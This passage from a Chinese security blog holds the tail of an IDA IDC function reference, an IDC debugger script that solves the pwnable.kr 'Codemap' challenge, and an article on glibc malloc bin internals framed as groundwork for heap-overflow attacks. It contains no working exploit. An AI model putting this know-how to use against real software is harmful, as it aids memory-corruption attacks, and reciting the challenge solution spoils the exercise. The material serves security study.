<li>long XrefType()   返回一个常量，说明某个交叉引用查询函数（如Dfirst）返回的最后一个交叉引用的类型。对于数据交叉引用，这些常量包括dr_0（提供的偏移量）、dr_w（数据写入）和dr_R（数据读取）</li>
<li>long DfirstB(long to)  返回将给定地址作为数据引用的第一个位置。如果不存在引用给定地址的交叉引用，则返回BADADDR</li>
<li>long DnextB(long to, long current)  如果current已经在前一次调用DfirstB或DnextB时返回，则返回将给定地址（to）作为数据引用的下一个位置。如果没有其他对给定地址的交叉引用存在，则返回BADADDR</li>
</ul>
<p>和代码交叉引用一样，如果需要知道你收到的交叉引用的类型，那么在调用另一个交叉引用查询函数之前，必须调用XrefType函数</p>
<h3 id="2-9-数据库操纵函数"><a href="#2-9-数据库操纵函数" class="headerlink" title="2.9 数据库操纵函数"></a>2.9 数据库操纵函数</h3><ul>
<li>void MakeUnkn(long addr, long flags)  取消位于指定地址的项的定义。这里的标志指出是否也取消随后的想的定义，以及是否删除任何与取消定义的项有关的名称。</li>
<li>long MakeCode(long addr)  将位于指定地址的字节转换成一条指令</li>
<li>long MakeByte(long addr)   将位于指定地址的项目转换成一个数据字节</li>
<li>long MakeWord(long addr)</li>
<li>long MakeDword(long addr)</li>
<li>bool MakeComm(long addr, string comment)  在给定的地址处添加一条常规注释</li>
<li>bool MakeFunction(long begin, long end)  将有begin到end的指令转换成一个函数。如果end被指定为BADADDR（-1），IDA会尝试通过定位函数的返回指令，来自动确定该函数的结束地址</li>
<li>bool MakeStr(long begin, long end)  创建一个当前字符串(由GetStringType返回)类型的字符串，涵盖由begin到end-1之间的所有字节。如果end被指定为BADADDR，IDA会尝试自动确定字符串的结束地址</li>
</ul>
<h3 id="2-10-数据库搜索函数"><a href="#2-10-数据库搜索函数" class="headerlink" title="2.10 数据库搜索函数"></a>2.10 数据库搜索函数</h3><p>三个最常见的标志为</p>
<ol>
<li>SEARCH_DOWN  搜索操作扫描高位地址</li>
<li>SEARCH_NEXT  略过当前匹配项，扫描下一个匹配项</li>
<li>SEARCH_CASE  区分大小写的方式进行二进制和文本搜索</li>
</ol>
<ul>
<li>long FindCode(long addr, long flags)  从给定的地址搜索一条指令</li>
<li>long FindDate(long addr, long flags)   从给定的地址搜索一个数据项</li>
<li>long FindBinary(long addr, long flags, string binary)  从给定的地址搜索一个字节序列。字符串binary指定一个十六进制字节序列值。如果没有设置SEARCH_CASE，且一个字节值指定一个大写或小写ASCII字母，则搜索仍然会匹配对应的互补值。例如&quot;41 42&quot;将匹配&quot;61 62&quot;、&quot;61 42&quot;等</li>
<li>long FindText(long addr, long flags, long row, long column, string text)  在约定的地址，从给定行(row)的给定列搜索字符串text。注意，某个给定地址的反汇编文本可能会跨越几行，因此要指定从哪一行开始搜索</li>
</ul>
<h3 id="2-11-反汇编行组件"><a href="#2-11-反汇编行组件" class="headerlink" title="2.11 反汇编行组件"></a>2.11 反汇编行组件</h3><ul>
<li>string GetDisasm(long addr)  返回给定地址的反汇编文本。返回的文本包括任何注释，但不包括地址信息</li>
<li>string GetMnem(long addr)  返回位于给定地址的指令的助记符部分</li>
<li>string GetOpnd(long addr, long opnum)  返回给定地址的指定操作数的文本形式。IDA以0为其实编号，从左向右对操作数编号</li>
<li>long GetOpType(long addr, long opnum)  返回一个整数，指出给定地址的给定操作数的类型。</li>
<li>long GetOperandValue(long addr, long opnum)  返回与给定地址的给定操作数有关的整数值。返回值的性质取决于GetOpType指定的给定操作数的类型</li>
<li>string CommentEx(long addr, long type)  返回给定地址处的注释文本。如果type为0，则返回常规注释文本；如果type为1，则返回可重复注释的文本。如果给定地址没注释，则返回空字符串。</li>
</ul>
<h2 id="3、IDC脚本示例"><a href="#3、IDC脚本示例" class="headerlink" title="3、IDC脚本示例"></a>3、IDC脚本示例</h2><h3 id="3-1-pwnable-kr中Codemap的idc脚本"><a href="#3-1-pwnable-kr中Codemap的idc脚本" class="headerlink" title="3.1 pwnable.kr中Codemap的idc脚本"></a>3.1 pwnable.kr中Codemap的idc脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">#include &lt;idc.idc&gt;  </div><div class="line"></div><div class="line">static main()&#123;  </div><div class="line"></div><div class="line">    auto max_eax, max_ebx, second_eax, second_ebx, third_eax, third_ebx;  </div><div class="line">    auto eax, ebx;  </div><div class="line"></div><div class="line">    // 依次为前三大堆块分配完成时的eax和ebx值</div><div class="line">    max_eax = 0;  </div><div class="line">    second_eax = 0;  </div><div class="line">    third_eax = 0;  </div><div class="line">    max_ebx = 0;  </div><div class="line">    second_ebx = 0;  </div><div class="line">    third_ebx = 0;  </div><div class="line"></div><div class="line">    AddBpt(0x1173E65);      // 在提示位置添加断点，在IDA中该地址为0x1173E65</div><div class="line">    StartDebugger(&quot;&quot;,&quot;&quot;,&quot;&quot;);  </div><div class="line">    auto count;  </div><div class="line">    for(count = 0; count &lt; 999; count ++)&#123;  </div><div class="line">        auto code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1);  </div><div class="line">        eax = GetRegValue(&quot;EAX&quot;);     // 中断时得到所需的值</div><div class="line">        ebx = GetRegValue(&quot;EBX&quot;);  </div><div class="line"></div><div class="line">        // 判断是否应刷新前三大堆块的值</div><div class="line">        if(max_eax &lt; eax)&#123;  </div><div class="line">            third_eax = second_eax;  </div><div class="line">            third_ebx = second_ebx;  </div><div class="line">            second_eax = max_eax;  </div><div class="line">            second_ebx = max_ebx;  </div><div class="line">            max_eax = eax;  </div><div class="line">            max_ebx = ebx;  </div><div class="line">        &#125;else if(second_eax &lt; eax)&#123;  </div><div class="line">            third_eax = second_eax;  </div><div class="line">            third_ebx = second_ebx;  </div><div class="line">            second_eax = eax;  </div><div class="line">            second_ebx = ebx;  </div><div class="line">        &#125;else if(third_eax &lt; eax)&#123;  </div><div class="line">            third_eax = eax;  </div><div class="line">            third_ebx = ebx;  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    // 输出</div><div class="line">    Message(&quot;max eax: %d, ebx: %x, second eax: %d, ebx: %x, third eax: %d, ebx: %x\n&quot;, max_eax, max_ebx, second_eax, second_ebx, third_eax, third_ebx);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>AddBpt(0x1173E65)   设置断点</li>
<li>StartDebugger(&quot;&quot;,&quot;&quot;,&quot;&quot;)   这里是直接启用本地调试器</li>
<li>auto code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1)</li>
<li>eax = GetRegValue(&quot;EAX&quot;);     // 中断时得到所需的值</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/15/Linux堆内存管理深入分析（下）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/15/Linux堆内存管理深入分析（下）/" itemprop="url">Linux堆内存管理深入分析（下）</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-15T19:31:03+08:00">
                2017-09-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0-前言回顾"><a href="#0-前言回顾" class="headerlink" title="0 前言回顾"></a>0 前言回顾</h2><p>在上一篇文章中（链接见文章底部），详细介绍了堆内存管理中涉及到的基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。通过前面的介绍，我们知道使用隐式链表来管理内存chunk总会涉及到内存的遍历，效率极低。对此glibc malloc引入了显示链表技术来提高堆内存分配和释放的效率。</p>
<p>所谓的显示链表就是我们在数据结构中常用的链表，而链表本质上就是将一些属性相同的“结点”串联起来，方便管理。在glibc malloc中这些链表统称为bin，链表中的“结点”就是各个chunk，结点的共同属性就是：</p>
<ul>
<li>均为free chunk；</li>
</ul>
<ul>
<li>同一个链表中各个chunk的大小相等(有一个特例，详情见后文)。</li>
</ul>
<h2 id="1-bin介绍"><a href="#1-bin介绍" class="headerlink" title="1 bin介绍"></a>1 bin介绍</h2><p>如前文所述，<font color="#f00"><strong>bin是一种记录free chunk的链表数据结构</strong></font>。系统针对不同大小的free chunk，将bin分为了4类：1) Fast bin; 2) Unsorted bin; 3) Small bin; 4) Large bin。</p>
<p>在glibc中用于记录bin的数据结构有两种，分别如下所示：</p>
<p><strong>fastbinsY</strong>: 这是一个数组，用于记录所有的fast bins；</p>
<p><strong>bins</strong>: 这也是一个数组，用于记录除fast bins之外的所有bins。事实上，一共有126个bins，分别是：</p>
<ul>
<li>bin 1 为unsorted bin;</li>
</ul>
<ul>
<li>bin 2 到63为small bin;</li>
</ul>
<ul>
<li>bin 64到126为large bin。</li>
</ul>
<p>其中具体数据结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">&#123;</div><div class="line">  ……</div><div class="line">  <span class="comment">/* Fastbins */</span></div><div class="line">  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line">  ……</div><div class="line">  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  <span class="comment">// #define NBINS    128</span></div><div class="line">  ……</div><div class="line">&#125;;</div><div class="line">这里mfastbinptr的定义：<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></div><div class="line">mchunkptr的定义：<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></div></pre></td></tr></table></figure>
<p>画图更直观：</p>
<p><img src="/images/2017-09-15/420rbsdeo2o0.png" alt=""></p>
<p>那么处于bins中个各个free chunk是如何链接在一起的呢？回顾malloc_chunk的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* 这两个指针只在free chunk中存在*/</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line"> </div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中的fd和bk指针就是指向当前chunk所属的链表中forward或者backward chunk。</p>
<h2 id="2-Fast-bin"><a href="#2-Fast-bin" class="headerlink" title="2 Fast bin"></a>2 Fast bin</h2><p>既然有fast bin，那就肯定有fast chunk——chunk size为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1249" target="_blank" rel="external">16</a>到<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1600" target="_blank" rel="external">80</a>字节的chunk就叫做fast chunk。为了便于后文描述，这里对chunk大小做如下约定：</p>
<p>1)      只要说到chunk size，那么就表示该malloc_chunk的实际整体大小；</p>
<p>2)      <strong>而说到chunk unused size，就表示该malloc_chunk中刨除诸如prev_size, size, fd和bk这类辅助成员之后的实际可用的大小。因此，对free chunk而言，其实际可用大小总是比实际整体大小少16字节。</strong></p>
<p>在内存分配和释放过程中，fast bin是所有bin中操作速度最快的。下面详细介绍fast bin的一些特性：</p>
<p>1) fast bin的个数——10个</p>
<p>2)每个fast bin都是一个单链表(<strong>只使用fd指针</strong>)。为什么使用单链表呢？因为在fast bin中无论是添加还是移除fast chunk，都是对“<strong>链表尾</strong>”进行操作，而不会对某个中间的fast chunk进行操作。更具体点就是LIFO(后入先出)算法：添加操作(free内存)就是将新的fast chunk加入链表尾，删除操作(malloc内存)就是将链表尾部的fast chunk删除。需要注意的是，为了实现LIFO算法，fastbinsY数组中每个fastbin元素均指向了该链表的rear end（尾结点），而尾结点通过其fd指针指向前一个结点，依次类推，如图所示。</p>
<p>在main arena中Fast bins(即数组fastbinsY)的整体操作示意图如下图所示：</p>
<p><img src="/images/2017-09-15/420rc04q9ad0.png" alt=""></p>
<p>​                        图2-1 fast bin示意图</p>
<p>3) chunk size：10个fast bin中所包含的fast chunk size是按照步进8字节排列的，即第一个fast bin中所有fast chunk size均为16字节，第二个fast bin中为24字节，依次类推。在进行malloc初始化的时候，最大的fast chunk size被设置为80字节(chunk unused size为64字节)，因此<strong>默认情况下大小为16到80字节的chunk被分类到fast chunk</strong>。详情如上图</p>
<p>4) 不会对free chunk进行合并操作。鉴于设计fast bin的初衷就是进行快速的<strong>小内存</strong>分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</p>
<p>5) malloc(fast chunk)操作：即用户通过malloc请求的大小属于fast chunk的大小范围(注意：用户请求size加上16字节就是实际内存chunk size)。在初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以当最开始使用malloc申请内存的时候，即使申请的内存大小属于fast chunk的内存大小(即16到80字节)，它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Maximum size of memory handled in fastbins.  */</span></div><div class="line"><span class="keyword">static</span> INTERNAL_SIZE_T global_max_fast;</div><div class="line"> </div><div class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></div><div class="line"><span class="comment">/*这里SIZE_SZ就是sizeof(size_t)，在32位系统为4，64位为8，fastbin_index就是根据要malloc的size来快速计算该size应该属于哪一个fast bin，即该fast bin的索引。因为fast bin中chunk是从16字节开始的，所有这里以8字节为单位(32位系统为例)有减2*8 = 16的操作！*/</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></div><div class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="comment">/* The maximum fastbin request size we support */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></div></pre></td></tr></table></figure>
<p>那么fast bin 是在哪？怎么进行初始化的呢？当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能：</p>
<ul>
<li>首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。</li>
</ul>
<ul>
<li>malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。</li>
</ul>
<p>然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin(见下面代码中的※1部分)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</div><div class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</div><div class="line">&#123;</div><div class="line">  ……</div><div class="line">  <span class="comment">/*</span></div><div class="line">     If the size qualifies as a fastbin, first check corresponding bin.</div><div class="line">     This code is safe to execute even if av is not yet initialized, so we</div><div class="line">     can try it without checking, which saves some time on this fast path.</div><div class="line">   */</div><div class="line">   <span class="comment">//第一次执行malloc(fast chunk)时这里判断为false，因为此时get_max_fast ()为0</span></div><div class="line">   <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</div><div class="line">    &#123;</div><div class="line">  ※<span class="number">1</span>  idx = fastbin_index (nb);</div><div class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</div><div class="line">      mchunkptr pp = *fb;</div><div class="line">      <span class="keyword">do</span></div><div class="line">        &#123;</div><div class="line">          victim = pp;</div><div class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">   ※<span class="number">2</span> <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))!= victim);</div><div class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</div><div class="line">            &#123;</div><div class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</div><div class="line">            errout:</div><div class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim));</div><div class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">            &#125;</div><div class="line">          check_remalloced_chunk (av, victim, nb);</div><div class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</div><div class="line">          alloc_perturb (p, bytes);</div><div class="line">          <span class="keyword">return</span> p;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户，见上面代码※2处。</p>
<p>6) free(fast chunk)操作：这个操作很简单，主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。</p>
<h2 id="3-Unsorted-bin"><a href="#3-Unsorted-bin" class="headerlink" title="3 Unsorted bin"></a>3 Unsorted bin</h2><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中(为什么，在什么情况下会发生这种事情呢？详情见后文)，系统就将这些chunk添加到unsorted bin中。为什么要这么做呢？这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。</p>
<p>Unsorted bin的特性如下：</p>
<p>1) unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。</p>
<p>2) Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。这就是前言说的特例了，不过特例并非仅仅这一个，后文会介绍。</p>
<h2 id="4-Small-bin"><a href="#4-Small-bin" class="headerlink" title="4 Small bin"></a>4 Small bin</h2><p>小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。</p>
<p>Small bin的特性如下：</p>
<p>1) small bin个数：62个。每个small bin也是一个由对应free chunk组成的循环双链表。同时Small bin采用FIFO(先入先出)算法：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk。</p>
<p>2) chunk size: 同一个small bin中所有chunk大小是一样的，且第一个small bin中chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 61*8 = 508字节。</p>
<p>3) 合并操作：相邻的free chunk需要进行合并操作，即合并成一个大的free chunk。具体操作见下文free(small chunk)介绍。</p>
<p>4) malloc(small chunk)操作：类似于fast bins，最初所有的small bin都是空的，因此在对这些small bin完成初始化之前，即使用户请求的内存大小属于small chunk也不会交由small bin进行处理，而是交由unsorted bin处理，如果unsorted bin也不能处理的话，glibc malloc就依次遍历后续的所有bins，找出第一个满足要求的bin，如果所有的bin都不满足的话，就转而使用top chunk，如果top chunk大小不够，那么就扩充top chunk，这样就一定能满足需求了(还记得上一篇文章中在Top Chunk中留下的问题么？答案就在这里)。注意遍历后续bins以及之后的操作同样被large bin所使用，因此，将这部分内容放到large bin的malloc操作中加以介绍。</p>
<p>那么glibc malloc是如何初始化这些bins的呢？因为这些bin属于malloc_state结构体，所以在初始化malloc_state的时候就会对这些bin进行初始化，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">malloc_init_state (mstate av)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  mbinptr bin;</div><div class="line"> </div><div class="line">  <span class="comment">/* Establish circular links for normal bins */</span></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</div><div class="line">    &#123;</div><div class="line">      bin = bin_at (av, i);</div><div class="line">      bin-&gt;fd = bin-&gt;bk = bin;</div><div class="line">	&#125;</div><div class="line">……</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意在malloc源码中，将bins数组中的<strong>第一个成员索引值设置为了**</strong>1**，而不是我们常用的0(在bin_at宏中，自动将i进行了减1处理…)。从上面代码可以看出在初始化的时候glibc malloc将所有bin的指针都指向了自己——这就代表这些bin都是空的。</p>
<p>过后，当再次调用malloc(small chunk)的时候，如果该chunk size对应的small bin不为空，就从该small bin链表中取得small chunk，否则就需要交给unsorted bin及之后的逻辑来处理了。</p>
<p>5) free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，<strong>最后将新的chunk添加到unsorted bin中</strong>。</p>
<h2 id="5-Large-bin"><a href="#5-Large-bin" class="headerlink" title="5 Large bin"></a>5 Large bin</h2><p>大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。</p>
<p>Large bin的特性如下：</p>
<p>1) large bin的数量：63个。Large bin类似于small bin，只是需要注意两点：一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置。</p>
<p>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。</p>
<p>鉴于同一个large bin中每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个large bin中的所有chunk按照chunk size进行<strong>从大到小的排列</strong>：最大的chunk放在链表的front end，最小的chunk放在rear end。</p>
<p>2) 合并操作：类似于small bin。</p>
<p>3) malloc(large chunk)操作：</p>
<p>初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk<strong>添加到unsorted bin</strong>中。</p>
<p>如果该large bin中最大的chunk的size小于用户请求的size的话，那么就依次查看后续的large bin中是否有满足需求的chunk，不过需要注意的是鉴于bin的个数较多(不同bin中的chunk极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话(即遍历每个bin中的chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以glibc malloc设计了Binmap结构体来帮助提高bin-by-bin检索的速度。Binmap记录了各个bin中是否为空，通过binmap可以避免检索一些空的bin。如果通过binmap找到了下一个非空的large bin的话，就按照上一段中的方法分配chunk，否则就使用top chunk来分配合适的内存。</p>
<p>4) Free(large chunk)：类似于small chunk。</p>
<p>了解上面知识之后，再结合下图5-1，就不难理解各类bins的处理逻辑了：</p>
<p><img src="/images/2017-09-15/420rc31ppb10.jpg" alt=""></p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h2><p>至此glibc malloc中涉及到的所有显示链表技术已经介绍完毕。鉴于篇幅和精力有限，本文没能详细介绍完所有的技术细节，但是我相信带着这些知识点再去研究glibc malloc的话，定能起到事半功倍的效果。</p>
<p>另外，就我个人所了解到的基于堆溢出攻击而言，掌握以上知识，已经足够理解绝大部分堆溢出攻击技术了。因此，后面的文章将会结合这些知识详细介绍各个攻击技术的实现原理。</p>
<p>老规矩：如有错误，欢迎斧正！</p>
<p><strong>作者：走位@阿里聚安全，更多安全技术文章，请点击</strong><a href="https://jaq.alibaba.com/community/index" target="_blank" rel="external"><strong>阿里聚安全博客 </strong></a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/10/Heap-Spray-堆与栈的协同攻击/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
